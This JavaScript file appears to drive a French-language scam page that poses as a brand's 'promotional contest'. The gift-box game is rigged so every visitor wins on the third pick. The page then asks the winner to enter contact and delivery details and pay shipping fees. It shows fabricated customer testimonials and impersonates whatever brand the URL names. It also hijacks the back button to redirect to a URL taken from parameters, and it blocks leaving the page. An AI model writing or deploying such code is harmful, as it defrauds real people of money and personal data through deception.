// <span class='date_day_week'></span>
// var array_day = new Array("vasárnap", "hétfő", "Kedd", "szerda", "csütörtök", "péntek", "szombat"); // HU
// var array_day = new Array("Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"); // FR
// var array_day = new Array("søndag", "mandag", "tirsdag", "onsdag", "torsdag", "fredag", "lørdag"); // DK
// var array_day = new Array("söndag", "måndag", "tisdag", "onsdag", "torsdag", "fredag", "lördag"); // SE
// var array_day = new Array("domenica", "lunedi", "martedi", "mercoledi", "giovedi", "venerdi", "sabato"); // IT
//var array_day = new Array( "domingo", "lunes", "martes", "miércoles", "jueves", "viernes", "sábado" ); // ES
var array_day = new Array("Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"); // ES


 // <span class='date_day_number'></span>
 // <span class='date_month'></span>
// var array_month = new Array("január", "február", "március", "április", "Lehet", "június", "július", "augusztus", "szeptember", "október", "november", "december"); // HU
// var array_month = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre"); // FR
// var array_month = new Array("januar", "februar", "marts", "april", "maj", "juni", "juli", "august", "september", "oktober", "november", "december"); // DK
// var array_month = new Array("Januari", "Februari", "Mars", "April", "Maj", "Juni", "Juli", "Augusti", "September", "Oktober", "November", "December"); // SE
//var array_month = new Array("gennaio", "febbraio", "marzo", "aprile", "maggio", "giugno", "luglio", "agosto", "settembre", "ottobre", "novembre", "dicembre"); // IT
//var array_month = new Array("enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"); // ES
var array_month = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre");

// <span class='date_year'></span>

var win_box = 'winbox.png'; // Prix dans la boîte
var title = 'Félicitations'; // Titre
var o = '#FFA400'; // Couleur du favicon
var a = ""; // Chemin relatif du logo
var a2 = ""; // Chemin relatif de l'icône à droite de l'en-tête
var b = "<span class='spo'></span> Concours promotionnel, aujourd'hui seulement - <span class='date_day_number'></span> <span class='date_month'></span> <span class='date_year'></span>"; // Sous-titre
var d = "Cher(e) client(e) <span class='spo'></span>,"; // Cher utilisateur
var e = "Chaque <span class='date_day_week'></span>, nous offrons à sept visiteurs chanceux la possibilité de gagner un nouveau produit <span class='w_b'></span>."; // Explication
var g = "Tout ce que vous avez à faire, c'est de choisir la bonne boîte !"; // Indications boîte 1
var h = "Essayez de trouver le <span class='w_b'></span> <span class='w'></span>"; // Indications boîte 2

var j = "J'aime"; // J'aime
var k = 4281; // J'aime de la page
var w = " "; // Séparateur de milliers pour les nombres
var l = 'Répondre'; // Répondre

// var m_1_i = 'g.gif'; // Image du modal 1
var m_1_i = 'a.png'; // Image du modal 1
var m_1_t = "<span class='spo'></span> Concours promotionnel"; // Titre du modal 1
var m_1_d = [{ // Description du modal 1
	"1": "Félicitations cher(e) client(e) <span class='spo'></span> !",
	"2": "Nous tenons à vous remercier pour votre fidélité à <span class='spo'></span> et vous offrir la possibilité de gagner le nouveau <strong><span class='w_b'></span> <span class='w'></span></strong> aujourd'hui !",
	"3": "Il vous suffit de choisir la bonne boîte cadeau.",
	"4": "<strong>Vous avez 3 essais, bonne chance !</strong>",
}];
var m_1_b = 'OK'; // Bouton du modal 1

var m_2_i = 's.png'; // Image du modal 2
var m_2_d_2 = '(2) essais supplémentaires';
var m_2_d_1 = '(1) essai supplémentaire';
var m_2_d = 'Désolé, cette boîte cadeau est vide ! Il vous reste encore <span id="try"></span>. Bonne chance !'; // Description du modal 2
var m_2_b = 'OK'; // Bouton du modal 2

var m_3_i = 'prize.png'; // Image du modal 3
var m_3_t = 'Félicitations !'; // Titre du modal 3
var m_3_s = '(1) <span class="w_b"></span> <span class="w"></span> est réservé(e) pour vous !'; // Sous-titre du modal 3
var m_3_d = [{ // Description du modal 3
	"1": "1. Confirmez vos coordonnées de contact et votre adresse de livraison sur la page suivante.",
	"2": "2. Payez les frais d'expédition et de manutention.",
	"3": "3. Votre <span class='w_b'></span> <span class='w'></span> sera livré(e) à l'adresse spécifiée dans un délai de 3 à 5 jours ouvrables.",
}];
var m_3_b = 'OK'; // Bouton du modal 3

var i = [{
	"1": {
		"name": "Ella Slobodian",
		"likes": "",
		"time": "Il y a 4 minutes",
		"comment": {
			"1": "Tous les cadeaux sont vides !",
		}
	},
	"2": {
		"name": "Robert Carlyle",
		"likes": "12",
		"time": "Il y a 5 minutes",
		"comment": {
			"1": "Je l'ai eu lors de ma deuxième tentative ! Oh ouais !!!",
		}
	},
	"3": {
		"name": "Valerie Clumy",
		"likes": "3",
		"time": "Il y a 11 minutes",
		"comment": {
			"1": "Merci beaucoup <span class='spo'></span> ! J'ai reçu ma récompense aujourd'hui par DHL !",
		}
	},
	"4": {
		"name": "Chris Chicks",
		"likes": "33",
		"time": "Il y a 15 minutes",
		"comment": {
			"1": "Suis-je la seule personne qui a perdu ? :(",
		}
	},
	"5": {
		"name": "Andy Porchetta",
		"likes": "42",
		"time": "Il y a 1 heure",
		"comment": {
			"1": "Ils sont incroyables ! Merci beaucoup d'avoir fait ça !",
		}
	},
	"6": {
		"name": "Charlotte Parkin",
		"likes": "419",
		"time": "Il y a 1 heure",
		"comment": {
			"1": "Je pensais que c'était une blague, mais mon <span class='w'></span> est arrivé ce matin. Cependant, vous devez suivre attentivement les instructions.",
		}
	},
	"7": {
		"name": "Kevin Mundie",
		"likes": "",
		"time": "Il y a 2 heures",
		"comment": {
			"1": "Merci à tous !",
		}
	},
}];

function getUrlParam2(parameter, defaultvalue){
    var urlparameter = defaultvalue;
    if(window.location.href.indexOf(parameter) > -1){
        urlparameter = getUrlVars()[parameter];
        }
    return urlparameter;
}

function getUrlParam(param, defaultValue) {
	const url = new URL(window.location.href),
		urlParams = new window.URLSearchParams(url.search),
		value = urlParams.get(param);
	return value ? value : defaultValue;
}

// ON PAGE LOAD
$(document).ready(function(){
	win_brand = getUrlParam('bra', 'Brand');
	win = getUrlParam('pro', 'Product');
	spo = getUrlParam('spo', '{device_brand}');

	$(document).prop('title', title);
	if ( a != '' ) { $('#a .a').append('<img class="left" src="' + a + '" />'); }
	if ( a2 != '' ) { $('#a .a').append('<img class="right" src="' + a2 + '" />'); }
	$('#a .a').append('<div class="z"></div>');
	if ( b != '' ) { $('#b').html('<div class="a">' + b + '</div>'); } else { $('#b').remove(); }
	if ( d != '' ) { $('#d').html(d); } else { $('#d').remove(); }
	if ( e != '' ) { $('#e').html(e); } else { $('#e').remove(); }
	if ( g != '' ) { $('#g').html(g); } else { $('#g').remove(); }
	if ( h != '' ) { $('#h').html(h); } else { $('#h').remove(); }
	if ( k != '' ) { $('#l').html(y(k,w)); } else { $('#l').html(y(1945,w)); }
	if ( i != '' ) {
		var m = '';
		var foo = 0;
		var bar = 0;
		$.each(i, function(idx, obj) {
			$.each(obj, function(idx, obj2) {
				foo++;
				if ( ( foo - 1 ) % 4 == 0 && foo != 1 ) { bar++; foo = foo - ((( foo - 1 ) / 4 ) * 4 ); } var f_t = 0; var f_l = 0; f_t = ( foo - 1 ) * 48; f_l = bar * 48;
				n = ''; oc = '';
				if ( obj2.comment ) { $.each(obj2.comment, function(idx, com) { oc = oc + "<p>" + com + "</p>"; }); }
				if ( obj2.likes > 0 ) { n = y(obj2.likes,w) + ' <span class="m"></span>'; } else { n = '<span class="m"></span>'; }
				m = m + '<div class="j"><div class="n" style="background:url(\'pics.jpg\') no-repeat;background-position:-' + f_t + 'px -' + f_l + 'px;"></div><div class="o"><div class="p">' + obj2.name + '</div><div class="q">' + oc + '</div><div class="r">' + l + ' · <span class="k"></span> ' + n + ' · <span class="s">' + obj2.time + '</span></div></div><div class="z"></div></div>';
			});
		});
		$('#k').html(m);
	} else { $('#k').remove(); }
	if ( j != '' ) { $('.m').each(function(i, obj) { $(this).html(j); }); }
	// modal 1
	if ( m_1_i != '' ) { $('#m_1_i').html('<img src="' + m_1_i + '" />'); } else { $('#m_1_i').remove(); }
	if ( m_1_t != '' ) { $('#m_1_t').html(m_1_t); } else { $('#m_1_t').remove(); }
	if ( m_1_d != '' ) {
		var m = '';
		// var foo = 0;
		$.each(m_1_d, function(idx, obj) { $.each(obj, function(idx, obj2) { m = m + '<p>' + obj2 + '</p>'; }); });
		$('#m_1_d').html(m);
	} else { $('#m_1_d').remove(); }
	if ( m_1_b != '' ) { $('#m_1_b a').text(m_1_b); } else { $('#m_1_b').text('OK'); }
	// modal 2
	if ( m_2_i != '' ) { $('#m_2_i').html('<img src="' + m_2_i + '" />'); } else { $('#m_2_i').remove(); }
	if ( m_2_d != '' ) { $('#m_2_d').html('<p>' + m_2_d + '</p>'); } else { $('#m_2_d').remove(); }
	if ( m_2_b != '' ) { $('#m_2_b a').text(m_2_b); } else { $('#m_2_b a').text('OK'); }
	// modal 3
	if ( m_3_t != '' ) { $('#m_3_t').html(m_3_t); } else { $('#m_3_t').remove(); }
	if ( m_3_s != '' ) { $('#m_3_s').html(m_3_s); } else { $('#m_3_s').remove(); }
	if ( m_3_i != '' ) { $('#m_3_i').html('<img src="' + m_3_i + '" />'); } else { $('#m_3_i').remove(); }
	if ( m_3_d != '' ) {
		var m = '';
		$.each(m_3_d, function(idx, obj) { $.each(obj, function(idx, obj2) { m = m + '<p>' + obj2 + '</p>'; }); });
		$('#m_3_d').html(m);
	} else { $('#m_3_d').remove(); }
	if ( m_3_b != '' ) { $('#m_3_b a').text(m_3_b); } else { $('#m_3_b a').text('OK'); }
	
	if ( win != '' ) { $('.w').each(function(i, obj) { $(this).html(win); }); }
	if ( win_brand != '' ) { $('.w_b').each(function(i, obj) { $(this).html(win_brand); }); }
	if ( spo != '' ) { $('.spo').each(function(i, obj) { $(this).html(spo); }); }
	
	// load boxes
	for (i = 0; i < 12; i++) {
		$('#i').append('<div class="e" id="b_' + i + '"><div class="f"><div class="g"><a href="#" onclick="cl(\'b_' + i + '\');return false;"><img src="a.png" /></a></div></div></div>');
	}
	$('#i').append('<div class="z"></div>');
	
	//load modal 1
	$('#m').fadeIn( "slow", function() {
		$('#m_1').fadeIn( "200", function() {});
		$('#m_1 .t_a').removeClass('small');
	});
	
	// dates
	var mydate = new Date();
	mydate.setDate(mydate.getDate()-0);
	
	var year=mydate.getYear();
	if (year < 1000) { year += 1900; }
	
	var day = mydate.getDay();
	var month = mydate.getMonth();
	
	var daym = mydate.getDate();
	if ( daym < 10 ) { daym = "0" + daym; }
	
	$('.date_day_number').each(function(i, obj) { $(this).html( daym ); });
	$('.date_month').each(function(i, obj) { $(this).html( array_month[month] ); });
	$('.date_day_week').each(function(i, obj) { $(this).html( array_day[day] ); });
	$('.date_year').each(function(i, obj) { $(this).html( year ); });
	
});
// ON PAGE LOAD

// ON CLICK
function cl(x) {
	if ( try_num > 2 ) {
		$('#try').html(m_2_d_2);
	} else {
		$('#try').html(m_2_d_1);
	}
	if ( try_num > 1 ) {
		try_num = try_num - 1;
		$('#' + x).html('<div class="f"><div class="h"><div></div></div></div>');
		$('#m').fadeIn( "slow", function() {
			$('#m_2').fadeIn( "200", function() {});
			$('#m_2 .t_a').removeClass('small');
		});
	} else {
		// win
		$('#' + x).html('<div class="f"><div class="i"><div></div><div></div><div></div></div></div>');
		if ( win_box != '' ) { $('#' + x + ' .i div:nth-child(1)').css("background","url('"+win_box+"')"); }
		if ( win_box != '' ) { $('#' + x + ' .i div:nth-child(1)').css("background-size","contain"); }
		$('#m').fadeIn( "slow", function() {
			$('#m_3').fadeIn( "200", function() {});
			$('#m_3 .t_a').removeClass('small');
		});
	}
}
// ON CLICK

// FAVICON
window.onload = function() {
	z(1);
};
// FAVICON

// COMMA
function y(x,y) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, y);
}
// COMMA

// FAVICON
function z(y) {
	if ( !y ) { y = 1; }
	var z1 = document.createElement('canvas');
	z1.width = 16;
	z1.height = 16;
	var x = z1.getContext('2d');
	x.beginPath();
	x.rect(0, 2, 14, 14);
	x.fillStyle = o;
	x.fill();
	x.beginPath();
	x.arc( 16 - 6 , 6, 6, 0, 2*Math.PI);
	x.fillStyle = '#ff0000';
	x.fill();
	x.strokeStyle = '#ffffff';
	x.stroke();
	x.font = 'bold 10px "arial", sans-serif';
	<!-- x.font-weight = "bold"; -->
	x.textAlign = "center";
	x.textBaseline = "middle";
	x.fillStyle = '#ffffff';
	x.fillText(y, 10, 6);
	favicon.href = z1.toDataURL('image/png');
}
// FAVICON

// GO
function go() {
	window.onbeforeunload = null;
}
	
// BACK
var bbid = getParam('bb');
if (bbid) {
var bburl = "//"+getParam('td')+"/"+bbid+"?cid="+getParam('cid');
! function() {
	  var t;
	  try {
		  for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
		  onpopstate = function(t) {
			window.onbeforeunload=null;
			t.state && location.replace(bburl);
		  }
	  } catch (o) {}
  }();
}

// GET PARAMETER
function getParam(name) {
	return decodeURI(
		(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
	);
}

// UNLOAD
var pz = 1;
window.onunload = window.onbeforeunload = function(evt) {
	var message = "Back to the store?";
	if (pz == 1) {
		if (typeof evt == "undefined") evt = window.event;
		if (evt) evt.returnValue = message;
		return message;
	}
};